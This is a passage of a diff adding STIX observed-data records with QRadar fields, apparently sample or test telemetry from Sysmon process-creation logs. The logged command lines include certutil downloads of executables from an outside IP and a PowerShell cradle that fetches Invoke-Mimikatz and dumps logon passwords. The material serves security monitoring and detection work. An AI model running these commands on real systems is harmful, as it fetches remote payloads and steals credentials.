JbWFnZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIFBhcmVu\ndENvbW1hbmRMaW5lOiAiQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiAK"
+                },
+                "6": {
+                    "type": "file",
+                    "hashes": {
+                        "SHA-1": "10CE9174BFF4856083E6ADAD0094A798CED2C079",
+                        "MD5": "7B973145F7E1B59330CA4DD1F86B3D55",
+                        "SHA-256": "589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4",
+                        "imp": "7A272B918680EE931C6FD622CAFBA542"
+                    },
+                    "name": "certutil.exe",
+                    "parent_directory_ref": "7"
+                },
+                "7": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\certutil.exe"
+                },
+                "8": {
+                    "type": "process",
+                    "binary_ref": "6",
+                    "command_line": "certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe",
+                    "cwd": "C:\\Windows\\system32\\",
+                    "pid": 744
+                },
+                "9": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\cmd.exe"
+                },
+                "10": {
+                    "type": "file",
+                    "parent_directory_ref": "9",
+                    "contains_refs": "6",
+                    "name": "cmd.exe"
+                }
+            },
+            "x_com_ibm_ariel": {
+                "devicetype": 12,
+                "qid_name": "Process Create",
+                "qid": 5001828,
+                "category_name": "Create Activity Succeeded    ",
+                "category_id": 19012,
+                "log_source_id": 112,
+                "log_source_name": "WinServer",
+                "identity_ip": "0.0.0.0",
+                "utf8_payload": "<182>Oct 10 15:47:16 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 744 Image: C:\\Windows\\System32\\certutil.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: CertUtil.exe Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=10CE9174BFF4856083E6ADAD0094A798CED2C079,MD5=7B973145F7E1B59330CA4DD1F86B3D55,SHA256=589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4,IMPHASH=7A272B918680EE931C6FD622CAFBA542 ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "magnitude": 2
+            },
+            "first_observed": "2019-10-10T14:47:16.689Z",
+            "last_observed": "2019-10-10T14:47:16.689Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--c19f8150-43c0-40b9-8c4e-062cbe349dc5",
+            "type": "observed-data",
+            "created_by_ref": "identity--28067052-21d2-429f-8582-b55bbfb4eca3",
+            "created": "2019-10-16T12:32:11.900Z",
+            "modified": "2019-10-16T12:32:11.901Z",
+            "objects": {
+                "0": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "2"
+                },
+                "1": {
+                    "type": "network-traffic",
+                    "src_ref": "0",
+                    "src_port": 0,
+                    "dst_ref": "3",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "2": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "4"
+                },
+                "4": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "5": {
+                    "type": "artifact",
+                    "payload_bin": "PDE4Mj5PY3QgMTAgMTU6NDc6MTcgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQyMTQJVGltZUdlbmVyYXRlZD0xNTcwMTEwODEzCVRpbWVX\ncml0dGVuPTE1NzAxMTA4MTMJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMg\nMTM6NTM6MzMuNTM4IFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkQ1RC01RDk1LTAwMDAtMDAxMEEw\nMkUwQzAwfSBQcm9jZXNzSWQ6IDc0NCBJbWFnZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjZXJ0dXRp\nbC5leGUgRmlsZVZlcnNpb246IDYuMS43NjAwLjE2Mzg1ICh3aW43X3J0bS4wOTA3MTMtMTI1NSkg\nRGVzY3JpcHRpb246IENlcnRVdGlsLmV4ZSBQcm9kdWN0OiBNaWNyb3NvZnTCriBXaW5kb3dzwq4g\nT3BlcmF0aW5nIFN5c3RlbSBDb21wYW55OiBNaWNyb3NvZnQgQ29ycG9yYXRpb24gQ29tbWFuZExp\nbmU6IGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzY3LjIyOS45Ny4yMjkvRjY0\nLmRhdGEgRjY0LmRhdGEgQ3VycmVudERpcmVjdG9yeTogQzpcV2luZG93c1xzeXN0ZW0zMlwgVXNl\ncjogV2luU2VydmVyXGFkbWluIExvZ29uR3VpZDogezFDMkQzRjU0LUY3MzUtNUQ5NS0wMDAwLTAw\nMjA5NDZEMDQwMH0gTG9nb25JZDogMHg0NmQ5NCBUZXJtaW5hbFNlc3Npb25JZDogMSBJbnRlZ3Jp\ndHlMZXZlbDogSGlnaCBIYXNoZXM6IFNIQTE9MTBDRTkxNzRCRkY0ODU2MDgzRTZBREFEMDA5NEE3\nOThDRUQyQzA3OSxNRDU9N0I5NzMxNDVGN0UxQjU5MzMwQ0E0REQxRjg2QjNENTUsU0hBMjU2PTU4\nOTIyOUUyQkQ5MzEwMDA0OTkwOUVERjk4MjVEQ0UyNEZGOTYzQTBDNDY1RDk2OTAyN0RCMzRFMkVC\nODc4QjQsSU1QSEFTSD03QTI3MkI5MTg2ODBFRTkzMUM2RkQ2MjJDQUZCQTU0MiBQYXJlbnRQcm9j\nZXNzR3VpZDogezFDMkQzRjU0LUZBNzItNUQ5NS0wMDAwLTAwMTBFMkU2MDkwMH0gUGFyZW50UHJv\nY2Vzc0lkOiAxNjY4IFBhcmVudEltYWdlOiBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUgUGFy\nZW50Q29tbWFuZExpbmU6ICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiIAo="
+                },
+                "6": {
+                    "type": "file",
+                    "hashes": {
+                        "SHA-1": "10CE9174BFF4856083E6ADAD0094A798CED2C079",
+                        "MD5": "7B973145F7E1B59330CA4DD1F86B3D55",
+                        "SHA-256": "589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4",
+                        "imp": "7A272B918680EE931C6FD622CAFBA542"
+                    },
+                    "name": "certutil.exe",
+                    "parent_directory_ref": "7"
+                },
+                "7": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\certutil.exe"
+                },
+                "8": {
+                    "type": "process",
+                    "binary_ref": "6",
+                    "command_line": "certutil -urlcache -split -f http://67.229.97.229/F64.data F64.data",
+                    "cwd": "C:\\Windows\\system32\\",
+                    "pid": 744
+                },
+                "9": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\cmd.exe"
+                },
+                "10": {
+                    "type": "file",
+                    "parent_directory_ref": "9",
+                    "contains_refs": "6",
+                    "name": "cmd.exe"
+                }
+            },
+            "x_com_ibm_ariel": {
+                "devicetype": 12,
+                "qid_name": "Process Create",
+                "qid": 5001828,
+                "category_name": "Create Activity Succeeded    ",
+                "category_id": 19012,
+                "log_source_id": 112,
+                "log_source_name": "WinServer",
+                "identity_ip": "0.0.0.0",
+                "utf8_payload": "<182>Oct 10 15:47:17 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 744 Image: C:\\Windows\\System32\\certutil.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: CertUtil.exe Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: certutil -urlcache -split -f http://67.229.97.229/F64.data F64.data CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=10CE9174BFF4856083E6ADAD0094A798CED2C079,MD5=7B973145F7E1B59330CA4DD1F86B3D55,SHA256=589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4,IMPHASH=7A272B918680EE931C6FD622CAFBA542 ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "magnitude": 2
+            },
+            "first_observed": "2019-10-10T14:47:17.722Z",
+            "last_observed": "2019-10-10T14:47:17.722Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--b698d80f-1800-48be-b4ba-956f7de5d7e1",
+            "type": "observed-data",
+            "created_by_ref": "identity--28067052-21d2-429f-8582-b55bbfb4eca3",
+            "created": "2019-10-16T12:36:47.358Z",
+            "modified": "2019-10-16T12:36:47.358Z",
+            "objects": {
+                "0": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "2"
+                },
+                "1": {
+                    "type": "network-traffic",
+                    "src_ref": "0",
+                    "src_port": 0,
+                    "dst_ref": "3",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "2": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "4"
+                },
+                "4": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "5": {
+                    "type": "artifact",
+                    "payload_bin": "PDE4Mj5PY3QgMTAgMTU6NDc6MTkgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQxODgJVGltZUdlbmVyYXRlZD0xNTcwMTEwNjcwCVRpbWVX\ncml0dGVuPTE1NzAxMTA2NzAJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMg\nMTM6NTE6MTAuNTcwIFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkNDRS01RDk1LTAwMDAtMDAxMDc4\nRUIwQjAwfSBQcm9jZXNzSWQ6IDIyNTIgSW1hZ2U6IEM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93\nc1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSBGaWxlVmVyc2lvbjogMTAuMC4xNDQwOS4x\nMDA1IChyczFfc3J2b29iLjE2MTIwOC0xMTU1KSBEZXNjcmlwdGlvbjogV2luZG93cyBQb3dlclNo\nZWxsIFByb2R1Y3Q6IE1pY3Jvc29mdMKuIFdpbmRvd3PCriBPcGVyYXRpbmcgU3lzdGVtIENvbXBh\nbnk6IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbiBDb21tYW5kTGluZTogcG93ZXJzaGVsbCAiSUVYIChO\nZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRo\ndWJ1c2VyY29udGVudC5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L21hc3Rlci9FeGZp\nbHRyYXRpb24vSW52b2tlLU1pbWlrYXR6LnBzMScpO0ludm9rZS1NaW1pa2F0eiAtQ29tbWFuZCAn\ncHJpdmlsZWdlOjpkZWJ1ZyBzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMgZXhpdCciIEN1cnJlbnRE\naXJlY3Rvcnk6IEM6XFdpbmRvd3Ncc3lzdGVtMzJcIFVzZXI6IFdpblNlcnZlclxhZG1pbiBMb2dv\nbkd1aWQ6IHsxQzJEM0Y1NC1GNzM1LTVEOTUtMDAwMC0wMDIwOTQ2RDA0MDB9IExvZ29uSWQ6IDB4\nNDZkOTQgVGVybWluYWxTZXNzaW9uSWQ6IDEgSW50ZWdyaXR5TGV2ZWw6IEhpZ2ggSGFzaGVzOiBT\nSEExPUYzOTNEN0I1MzFDRDQ0Q0U0MTg2NDdGRTk1NzE1QURDM0UzQzYxRDIsTUQ1PUVCMzJDMDcw\nRTY1ODkzN0FBOUZBOUYzQUU2MjlCMkI4LFNIQTI1Nj03MEJBNTdGQjBCRjJGMzRCODY0MjZEMjE1\nNTlGNUY2RDA1QzEyNjgxOTM5MDRERThFOTU5RDdCMDZDRTk2NENFLElNUEhBU0g9QTREMzJGMUFF\nRjUyNUI4QURBNkEyNkYyODU5NkFDMkUgUGFyZW50UHJvY2Vzc0d1aWQ6IHsxQzJEM0Y1NC1GQTcy\nLTVEOTUtMDAwMC0wMDEwRTJFNjA5MDB9IFBhcmVudFByb2Nlc3NJZDogMTY2OCBQYXJlbnRJbWFn\nZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIFBhcmVudENvbW1hbmRMaW5lOiAiQzpcV2lu\nZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiAK"
+                },
+                "6": {
+                    "type": "file",
+                    "hashes": {
+                        "SHA-1": "F393D7B531CD44CE418647FE95715ADC3E3C61D2",
+                        "MD5": "EB32C070E658937AA9FA9F3AE629B2B8",
+                        "SHA-256": "70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE",
+                        "imp": "A4D32F1AEF525B8ADA6A26F28596AC2E"
+                    },
+                    "name": "powershell.exe",
+                    "parent_directory_ref": "7"
+                },
+                "7": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                },
+                "8": {
+                    "type": "process",
+                    "binary_ref": "6",
+                    "command_line": "powershell \"IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command privilege::debug sekurlsa::logonpasswords exit\"",
+                    "cwd": "C:\\Windows\\system32\\",
+                    "pid": 2252
+                },
+                "9": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\cmd.exe"
+                },
+                "10": {
+                    "type": "file",
+                    "parent_directory_ref": "9",
+                    "contains_refs": "6",
+                    "name": "cmd.exe"
+                }
+            },
+            "x_com_ibm_ariel": {
+                "devicetype": 12,
+                "qid_name": "Process Create",
+                "qid": 5001828,
+                "category_name": "Create Activity Succeeded    ",
+                "category_id": 19012,
+                "log_source_id": 112,
+                "log_source_name": "WinServer",
+                "identity_ip": "0.0.0.0",
+                "utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command privilege::debug sekurlsa::logonpasswords exit\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "magnitude": 6
+            },
+            "first_observed": "2019-10-10T14:47:19.690Z",
+            "last_observed": "2019-10-10T14:47:19.690Z",
+            "number_observed": 1
+        }
+    ]
+}
+
